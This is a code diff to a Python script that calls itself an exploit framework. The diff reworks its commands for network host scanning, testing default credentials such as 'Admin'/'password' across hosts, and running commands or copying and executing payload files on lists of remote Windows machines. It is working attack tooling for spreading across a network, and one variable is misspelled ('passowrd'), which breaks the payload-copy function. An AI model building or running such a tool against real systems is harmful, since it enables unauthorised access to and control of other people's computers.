@@ -19,7 +19,7 @@ banner = '''
                           '''
 validCommands = ["scan", "scannames", "hosts", "credtest", "getcmd", "rexec", "rcpy", "msg", "include", "exclude", "intel"]
 validDesc = ["Run a ping scan to identify hosts on the network", "Run a scan to find all the hosts on the network using netbios name" , "List all hosts stored on this device","Test to see if default creds work", "Open a shell on a remote system (user / pass)", "Run a command on a single or a group of PCs (add default to use 'Default' list)", "rexec but copy and execute a file from this system", "Message a single or group of computers", "Remove an IP from the protected list", "Add an IP to the protected list", "View intel on a given IP"]
-validUsage = ["-", "-", "credtest [username:password] [list name to save under]", "getcmd [ip] [username] [password]", "-", "-", "-", "exclude [ip]", "include [ip]", "intel [ip]"]
+validUsage = ["-", "-", "-","credtest [username:password] [list name to save under]", "getcmd [ip] [username] [password]", "rexec [list name] [username:password] [command]", "rcpy [list name] [username:password] [payload name]", "-", "exclude [ip]", "include [ip]", "intel [ip]"]
 ips = []
 ipNames = ["Default"]
 customLists = [[]]
@@ -151,8 +151,6 @@ def menu():
         if cmd[0] == "msg":
             rmsg()
 
-
-
         if cmd[0] == "clear":
             os.system("cls")
             for line in banner:
@@ -160,18 +158,20 @@ def menu():
             print("\nCYBERFIRST EXPLOIT FRAMEWORK v0.2")
 
         if cmd[0] == "rexec":
-            if len(cmd) > 1:
-                if cmd[1] == "default":
-                    rexec(defaultMode=True)
-            else:
-                rexec()
+            if len(cmd) == 4:
+                targList = customLists[ipNames.index(cmd[1])]
+                creds = cmd[2]
+                command = cmd[3]
+                rexec(targList, command, creds)
+
 
         if cmd[0] == "rcpy":
-            if len(cmd) > 1:
-                if cmd[1] == "default":
-                    rcpy(defaultMode=True)
-            else:
-                rcpy()
+            if len(cmd) == 4:
+                targList = customLists[ipNames.index(cmd[1])]
+                creds = cmd[2]
+                payload = cmd[3]
+                rcpy(targList, payload, creds)
+
 
         if cmd[0] == "scan":
             rscan()
@@ -256,40 +256,20 @@ def credTest(creds="Profile:password", iplist="default"):
     print("\n[+] Found %s devices with default credentials of %s" % (str(len(customLists[listIndex])), creds))
     print("[+] " + str(customLists[listIndex]).replace(" ", ""))
 
-
-def rexec(defaultMode=False, copyExe=False):
+def rexec(targets, cmd, creds):
     global completeFlags
-    global outputs
     completeFlags = []
-
-    iprangeMin = int(input("\n[IPMIN]> "))
-    iprangeMax = int(input("[IPMAX]> ")) + 1
-    if not defaultMode:
-        uname = input("[UNAME]> ")
-        pword = input("[PWORD]> ")
-        cmnd = input("[COMND]> ")
-        index = 0
-        for i in range(iprangeMin, iprangeMax):
-            if i in ips and i not in exclude:
-                completeFlags.append(0)
-                x = threading.Thread(target=rexecT, args=(i,uname, pword, cmnd, index))
-                x.start()
-                time.sleep(.1)
-                index += 1
-        while 0 in completeFlags:
-            pass
-    else:
-        cmnd = input("[COMND]> ")
-        index = 0
-        for i in range(iprangeMin, iprangeMax):
-            if i in defaultCredIps and i not in exclude:
-                completeFlags.append(0)
-                x = threading.Thread(target=rexecT, args=(i,"Admin", "password", cmnd, index))
-                x.start()
-                time.sleep(.1)
-                index += 1
-        while 0 in completeFlags:
-            pass
+    uname = creds.split(":")[0]
+    password = creds.split(":")[1]
+    index = 0
+    for i in targets:
+        completeFlags.append(0)
+        x = threading.Thread(target=rexecT, args=(i, uname, password, cmd, index))
+        x.start()
+        time.sleep(.1)
+        index += 1
+    while 0 in completeFlags:
+        pass
     print("\n[+] Done")
 
 
@@ -311,42 +291,21 @@ def rexecT(tgt=0, uname="", pword="", cmd="", index=0, sav=False, listIndex=0): 
 
     completeFlags[index] = 1
 
-
-def rcpy(defaultMode=False):
+def rcpy(targetList, payload, creds):
     global completeFlags
+    global customLists
     completeFlags = []
-    interactive = input("[!] Specify if you want this to run visibly on the desktop with y/n\n[SCREEN]> ")
-    if interactive.lower() == "y":
-        interactive = True
-        print("[+] Interactive is on")
-    else:
-        interactive = False
-    fname = input("[FILE ]> ")
-    iprangeMin = int(input("\n[IPMIN]> "))
-    iprangeMax = int(input("[IPMAX]> ")) + 1
-    if defaultMode == False:
-        uname = input("[UNAME]> ")
-        pword = input("[PWORD]> ")
-
-        index = 0
-        for i in range(iprangeMin, iprangeMax):
-            if i in ips and i not in exclude:
-                completeFlags.append(0)
-                x = threading.Thread(target=rcpyT, args=(i,uname, pword, fname, index, interactive))
-                x.start()
-                index += 1
-        while 0 in completeFlags:
-            pass
-    else:
-        index = 0
-        for i in range(iprangeMin, iprangeMax):
-            if i in ips and i not in exclude:
-                completeFlags.append(0)
-                x = threading.Thread(target=rcpyT, args=(i,"Profile", "password", fname, index, interactive))
-                x.start()
-                index += 1
-        while 0 in completeFlags:
-            pass
+    uname = creds.split(":")[0]
+    password = creds.split(":")[1]
+    index = 0
+    for i in targetList:
+        completeFlags.append(0)
+        x = threading.Thread(target=rcpyT, args=(i, uname, passowrd, payload, index, False))
+        x.start()
+        time.sleep(.1)
+        index += 1
+    while 0 in completeFlags:
+        pass
     print("\n[+] Done")
 
 
@@ -373,7 +332,7 @@ def rscan():  # Conducts a ping scan to discover any hosts on the network
             ips.append(i)
     os.system("cls")
     print("\n==================================================")
-    print("\n[+] PRESCAN COMPLETE")
+    print("\n[+] HOST SCAN COMPLETE")
     print("\n[+] DISCOVERED: " + str(len(ips)))
     print("\n[+] RANGE: " + str(ips[0]) + " -> " + str(ips[-1]))
     print("\n==================================================\n")
@@ -386,7 +345,7 @@ def rscannames():  # Conducts a scan of the netbios names to discover any hosts 
         ips.append(os.system(r"C:\Users\Admin\nbtscan " + "\"" + str(name) + "\""))
     os.system("cls")
     print("\n==================================================")
-    print("\n[+] PRESCAN COMPLETE")
+    print("\n[+] NAME SCAN COMPLETE")
     print("\n[+] DISCOVERED: " + str(len(ips)))
     print("\n[+] RANGE: " + str(ips[0]) + " -> " + str(ips[-1]))
     print("\n==================================================\n")
